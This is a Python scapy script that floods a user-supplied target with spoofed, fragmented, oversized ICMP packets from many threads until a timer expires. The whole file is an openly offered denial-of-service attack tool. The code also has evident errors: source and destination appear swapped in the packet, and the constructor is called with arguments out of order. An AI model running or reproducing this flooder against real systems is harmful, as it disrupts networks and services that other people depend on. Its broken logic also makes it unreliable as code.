import time
import random
import threading
from scapy.all import *

ip = input("Target: ")
spoof = input("Spoofed IP: ")
threads = int(input("Threads: "))
timer = float(input("Time(S): "))

class main:
	def __init__(self, ip, threads, spoof, timer):
		self.ip = ip
		self.spoof = spoof
		self.threads = threads
		self.timer = timer
		
		self.timeout = time.time() + 1 * self.timer
		
		self.init_flood()
		self.wait()

	def init_flood(self):
		for i in range(self.threads):
			threading.Thread(target=self.flood, daemon=True).start()

	def flood(self):
		while time.time() < self.timeout:
			packet = IP(src=self.ip, dst=self.spoof)/ICMP()/("Z" * 65535)
			send(fragment(packet), loop=1, verbose=0)

	def wait(self):
		while time.time() < self.timeout:
			try:
				time.sleep(1)
			except KeyboardInterrupt:
				print("Quitting.")
				break

if __name__ == "__main__":
	main(ip, spoof, threads, timer)
